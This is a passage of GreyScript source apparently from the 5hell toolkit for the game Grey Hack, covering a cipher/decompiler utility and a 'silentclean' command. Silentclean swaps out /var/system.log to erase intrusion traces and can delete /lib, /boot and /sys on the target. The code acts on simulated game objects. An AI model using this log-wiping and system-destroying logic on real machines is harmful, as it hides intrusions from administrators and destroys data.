	if @arg2 == "*" then arg2 = "mul"
	if @arg2 == "/" then arg2 = "div"
	if calc.hasIndex(@arg1) then
		c = @calc[arg1]
		if typeof(@arg2) == "number" then arg2 = str(arg2)
		return str(c(arg2.val))
	else
		if calc.hasIndex(@arg2) then
			c = @calc[arg2]
			par1 = 0
			par2 = 0
			if typeof(@arg1) == "function" then par1 = @arg1 else par1 = arg1
			if typeof(@arg3) == "function" then par2 = @arg3 else par2 = arg3
			if DEBUG then print("par1: "+typeof(@par1)+char(10)+"par2: "+typeof(@par2)+char(10))
			if typeof(@arg1) == "string" then par1 = arg1.val
			if typeof(@arg3) == "string" then par2 = arg3.val
			if DEBUG then print("par1: "+@par1+char(10)+"par2: "+@par2+char(10))
			return str(c(@par1,@par2))
		else
			return "calc: <b>invalid input</b>"
		end if
	end if
end function
command.code = function(arg1, arg2, arg3=0, arg4=0)
	if DEBUG then print("code: input: "+typeof(@arg1))
	if typeof(@arg1) == "function" then
		print("Function() detected...")
		return globals.decompiler(@arg1)
	end if
	if @arg1 == null or @arg1 == "-h" or @arg1 == "help" then return "<u>character code || cipher || encryption || || decryption || decompiler"+char(10)+
	"<b>CODE</b> encode and decode utility"+char(10)+
	"Supports standard Caesar cipher and 5hell's MuninCipher for encryption."+char(10)+
	"May also return ascii character codes, decompile objects, and execute functions."+char(10)+
	"Usage: code [char] -- returns ascii code for char"+char(10)+
	"Usage: code -c [int] -- returns ascii char(int)"+char(10)+
	"Usage: code [any_function|any_object] -- sends object to decompiler to view object map."+char(10)+
	"-- will evaluate piped functions."+char(10)+
	"Advanced: code [-d|-e] [word] -- decode|encode a word using standard caesar cypher"+char(10)+
	"Advanced: code [-a|-b] [opt:input] -- encode|decode using <b>MuninCipher(tm)</b>"+char(10)+
	"-- prompts for input if not supplied"+char(10)+
	"-- enter text to encrypt|decrypt on a single line up to 40,000 chars"+char(10)+
	"-- if input is more than one word use without params for prompt"+char(10)+
	"-- or use piping or an input file (see -f options)"+char(10)+
	"Advanced: code [-f|-fa|-fb] [/file/path|file_object] -- encode|decode contents of file"+char(10)+
	"-- option [-f] [path] -- prompts for enc/dec"+char(10)+
	"-- option [-fa|-af] [path] -- encode contents of path with MuninCipher"+char(10)+
	"-- option [-fb|-bf] [path] -- decode contents of path with MuninCipher"+char(10)+
	"<b>N.B.</b> MuninCipher is tamper resistant! Attempting to copy/paste the cipher text can/will corrupt it!"
	Encode = function(instruction, password)
    caesar = function(type, pass)
				if pass == "" then return char(32)
        nr = pass.len%9
				if nr == 0 then nr = 25
        crypt = function(char, nr, type)
            if type == "enc" then return char+nr
            if type == "dec" then return char-nr
        end function
        out = []
        for i in range(0, pass.len-1)
            c = pass[i].code
            if c >= 48 and c <= 57 then
                c = crypt(c, nr, type)
                if c < 48 then c = c+10
                if c > 57 then c = c-10
            else if c >= 65 and c <= 90 then
                c = crypt(c, nr, type)
                if c < 65 then c = c+26
                if c > 90 then c = c-26
            else if c >= 97 and c <= 122 then
                c = crypt(c, nr, type)
                if c < 97 then c = c+26
                if c > 122 then c = c-26
            end if
            out.push(char(c))
        end for
        return out.join("")
    end function
    output = caesar(instruction, password)  // instruction should be either "enc" for encode or "dec" for decode
    return output
	end function
	if @arg1 == 0 then return str(char(32).code)
	if @arg1 == "0" then return str("0".code)
	if typeof(@arg1) == "number" then
		print("<mark=red><size=75%>Converting integer...</mark></size>")
		arg1 = str(arg1)
	end if
	if @arg1 == "-a" or @arg1 == "-b" then
		enc_line = arg2
		if arg2 and typeof(arg2) != "string" then return "code: -a|-b expects string input, got"+typeof(arg2)
		if not arg2 then enc_line = user_input("MuninCipher:> ")
		if enc_line.len > 40000 and @arg1 == "-a" then return "MC: max 40k characters for encode"
		cipher_input = []
		cipher_output = []
		enc_dec = "enc"
		if @arg1 == "-b" then enc_dec = "dec"
		cipher_this = ""
		if enc_dec == "enc" then
			cipher_input = enc_line.split(char(32))
		else
			cipher_input.push(arg2)
		end if
		print(colorLightBlue+"<mark=black>M</mark>unin<mark=black>C</mark>iphering: "+cipher_input.join(" "))
		/////////////////////////////////////
		if enc_dec == "dec" then
			input_split = cipher_input[0].split(char(40001))
			ci_sli_dex = cipher_input[0].split(char(40001))[1]
			ci_sli_txt = cipher_input[0].split(char(40001))[0]
			cipher_size = ci_sli_dex.values
			cipher_size = cipher_size.pop
			cipher_size = cipher_size.code
			ci_sli_txt = ci_sli_txt.values
			spaces = []
			last_space = 0
			for dex in ci_sli_dex
				spaces.push(dex.code+last_space+1)
				last_space = spaces[-1]
			end for
			buf = []
			spaces.pop
			for ci in range(0, cipher_size)
				if DEBUG then print("debug: ci = "+ci)
				if spaces.len and spaces[0] == ci+1 then
					buf.push(char(32))
					spaces.pull
				else
					if ci_sli_txt.len then buf.push(ci_sli_txt.pull)
				end if
			end for
			buf = buf.join("")
			cipher_input = buf.split(char(32))
		end if
		for password in cipher_input
		  cipher_this = password
		  for l in range(0,cipher_this.len)
		    cipher_this = Encode( enc_dec, cipher_this )
		  end for
		  cipher_output.push(cipher_this)
		end for
		if enc_dec == "enc" then
			spacedex = ""
			for co in cipher_output
				spacedex = spacedex + char(co.len)
			end for
			leng = cipher_output.join(" ").len
			cipher_output.push(char(40001))
			cipher_output.push(spacedex)
			cipher_output.push(char(leng))
			cipher_output.push(char(40001))
			cipher_output = cipher_output.join("")
		end if
		print(colorLightBlue+"<u><mark=black>= = = = = = = = = = = = = = = = = = = = = = = = = = = = =</mark></u>"+CT)
		if enc_dec == "dec" then return cipher_output.join(" ")
		return cipher_output
	end if
	if @arg1 == "-c" and arg2 then return char(arg2.to_int)
	if @arg1 == "-d" then
		if not arg2 then return "nothing to decode"
		return Encode("dec", arg2)
	end if
	if @arg1 == "-e" then
		if not arg2 then return "nothing to encode"
		return Encode("enc", arg2)
	end if
	if @arg1 == "-f" or @arg1 == "-fa" or @arg1 == "-af" or @arg1 == "-bf" or @arg1 == "-fb" then
		act = 0
		if @arg1 == "-f" then act = (-1)
		if @arg1 == "-fa" or @arg1 == "-af" then act = 1
		cipher_file = null
		cipher_text = ""
		if not arg2 then return "code: -f expects a file_path or file_object"
		if typeof(arg2) == "file" then
			if not arg2.is_binary then cipher_file = arg2 else return "code: cannot open binary file"
			if cipher_file.has_permission("r") then cipher_text = cipher_file.get_content.trim else return "code: read error. check permissions"
		end if
		if typeof(arg2) == "string" then
			cipher_text = command.cat(arg2)
		end if
		if act < 0 then act = user_input("[0] decode [<b>1</b>] encode ||: ",0,1).to_int
		if act == 0 then act = "-b" else act = "-a"
		return command.code(act, cipher_text)
	end if
	if DEBUG then print("Checking types...")
	buf = []
	if typeof(@arg1) == "string" then
		print("<mark=yellow><size=75%>Processing string...</mark></size>")
		if arg1 == "\n" then return str(char(10).code)
		if arg1 == 0 or arg1 == " " then return str(" ".code)
		arg1 = arg1.values
		for letter in arg1
			buf.push(letter.code)
		end for
		if DEBUG then print "debug: code: string buf: "+buf
		return buf.join(", ")
	end if
	if typeof(@arg1) == "shell" or typeof(@arg1) == "ftpshell" or typeof(@arg1) == "file" or typeof(@arg1) == "computer" or typeof(@arg1) == "map" or typeof(@arg1) == "custom_object" or typeof(@arg1) == "list" then return globals.decompiler(@arg1)
	if typeof(@arg1) == "pshell" or typeof(@arg1) == "pcomputer" or typeof(@arg1) == "pfile" or typeof(@arg1) == "prouter" then return globals.decompiler(@arg1)
	if @arg1.hasIndex("__isa") then return globals.decompiler(@arg1)
	check = new @arg1 
	if typeof(@check) == "map" then return globals.decompiler(@arg1)
	return "code: unkown type"
end function
command.silentclean = function(arg1=0, arg2=0, arg3=0, arg4=0)
	if arg1 == "-h" or arg1 == "help" then
		return "<u>SILENTCLEAN || silentclean || log wipe || scrubber || corrupt logs"+char(10)+
		"Usage: silentclean [opt:-d|-n|--n] [opt: shell|computer] -- corrupt the system.log"+char(10)+
		"-- operates on active computer/shell object or piped computer/shell object"+char(10)+
		"Usage: "+colorWhite+"</b>silentclean "+CT+"-- corrupt system.log of active computer/shell object"+char(10)+"--"+char(10)+
		"Usage: "+colorWhite+"</b>silentclean "+CT+"["+colorWhite+"-d"+CT+"] -- delete rkit and/or 5hell, then corrupt system.log"+char(10)+"--"+char(10)+
		"Usage: "+colorWhite+"</b>silentclean "+CT+"["+colorWhite+"-n"+CT+"] -- nuke system, delete rkit/5hell, corrupt system.log"+char(10)+
		"-- use ["+colorWhite+"--n"+CT+"] on systems running <b>Xorg</b> (aka a home pc)"+char(10)+"--"+char(10)+
		"Alias: you may use <b>sc</b> in place of <b>silentclean</b>"+char(10)+
		"-- e.g: |><b> silentclean -d</b> is the same as:"+char(10)+
		"--------|><b> sc -d</b>"+char(10)+
		colorGold+"</b>-- this is defined in 5hell.src >> aliases section"+char(10)+
		"N.B. run sc as root since /var is usually write protected."+char(10)+char(10)+
		"<b>Silentclean now supports piped objects!"+char(10)+
		"Usage: "+colorWhite+"</b>silentclean "+CT+" [<b>shell|computer</b>] -- run silentclean on a piped computer or shell "+char(10)+
		"Usage: "+colorWhite+"</b>silentclean "+CT+"["+colorWhite+"-d"+CT+"] [<b>shell|computer</b>] -- run silentclean [-d|-n] on a piped object"+char(10)+
		"NOTE: if silentclean detects "+colorLightBlue+"Xorg "+CT+"as a running process on the machine:"+char(10)+
		"-- it will determine you are on a home pc and require an override to execute"+char(10)+
		"-- this is to help prevent accidentally nuking yourself"+char(10)+
		"-- the override flag is <b>--n</b>"+char(10)+
		"--ie: <b>silentclean --n</b>"+char(10)+char(10)+
		"N.B. silentclean [-n|--n] will remove the following:"+char(10)+
		colorOrange+"</b>-- /lib, /boot, /sys, 5hell, rkit"+char(10)+
		char(10)+
		colorGold+"Advanced: "+char(10)+
		"By default, silentclean will create the file /var/system.bak and move it over /var/system.log."+char(10)+
		"While this works wonders for preventing traces, when the log regenerates (as it eventually will) it will"+char(10)+
		"generate with guest-readable permissions. To combat this, or to engage in other creative shenanigans, you"+char(10)+
		"may create a file called 'silentclean' or rename an empty log file, or other file, as silentclean, and this"+char(10)+
		"command (as well as rclean) will select that file to move over system.log. In this manner, the log is not"+char(10)+
		"actually corrupted, and thus retains it's permissions when the next log write occurs."+char(10)+
		"Naturally, this allows you to leave 'custom' log files behind in addition to just covering your tracks."
	end if
	store = globals.localmachine
	_fix = function()
		globals.localmachine = store
		return "."
	end function
	//if arg1 and typeof(arg1) != "string" and arg1 != "-d" and arg1 != "-n" then print colorOrange+"silentclean: <b>ignoring</b> unsupported input"+char(10)+"-- instead: use rclean [opt:-d|-n] [piped_object]"+char(10)+"-- or open the object with glasspool then run sc [-d|-n]"+char(10)+"--eg: <b>gp -d "" sc -d """
	if arg1 and arg1 != "-d" and arg1 != "-n" and typeof(arg1) != "shell" and typeof(arg1) != "computer" then return colorWarning+"<size=75%>silentclean: unsupported input; aborting to avoid catastrophe"
	if arg1 or arg2 then 
		//print colorOrange+"silentclean: warning: additional parameters detected"+char(10)+"-- silentclean does not support piped objects"+char(10)+"-- use rclean instead"
		if typeof(arg2) == "shell" then globals.localmachine = arg2.host_computer
		if typeof(arg2) == "computer" then globals.localmachine = arg2 
		if typeof(arg1) == "shell" then globals.localmachine = arg1.host_computer
		if typeof(arg1) == "computer" then globals.localmachine = arg1
		// use _fix to restore localmachine
		// just ignore anything else, use rclean for file objects
	end if
	cleaner = command.tree("/","5hell","1","N")
	if cleaner then 
		if cleaner.parent.name == "rkit" then cleaner = cleaner.parent
	end if
	syslog = globals.get_file("/var/system.log")
	if not syslog then return "silentclean: <b>/var/system.log not found"+_fix

	nuke_em = function()
		libFolder =  globals.get_file("/lib")
		bootFolder = globals.get_file("/boot")
		systemFolder = globals.get_file("/sys")
		if cleaner then cleaner.delete
		if libFolder then libFolder.delete
		if bootFolder then bootFolder.delete
		if systemFolder then systemFolder.delete
		print("Files nuked. Reboot when ready.")
	end function

	if syslog and syslog.has_permission("w") and syslog.parent.has_permission("w") then
		// check for file named silentclean
		syslogbak = command.tree("/","silentclean","1","N")
		if not syslogbak then 
			localmachine.touch("/var","system.bak")
			syslogbak = globals.get_file("/var/system.bak")
		end if
		if typeof(syslogbak) == "file" then
			//syslog.delete
			if not syslogbak.is_binary then syslogbak.set_content("No IPs Today :D")
		else
			return "silentclean: write failed; permission denied"+_fix
		end if
		if arg1 == "-n" then 
			if globals.localmachine.show_procs.indexOf("Xorg") == null then arg1 = "--n" else return "silentclean: "+colorOrange+"</b>detected home pc; execution halted"+_fix+char(10)+"-- re-run with "+colorWhite+"</b>silentclean --n"+CT+" to override"
		end if
		if arg1 == "--n" then nuke_em
		if arg1 == "-d" or arg1 == "--n" then
			if cleaner then cleaner.delete
		end if
		try = syslogbak.move("/var", "system.log")
		syslog = globals.get_file("/var/system.log")
		// add code to give the new file the same permissions as the original log
		_fix
		return try
	else
		return "silentclean: write failed; permission denied"+_fix
	end if
	_fix
	return 0
end function
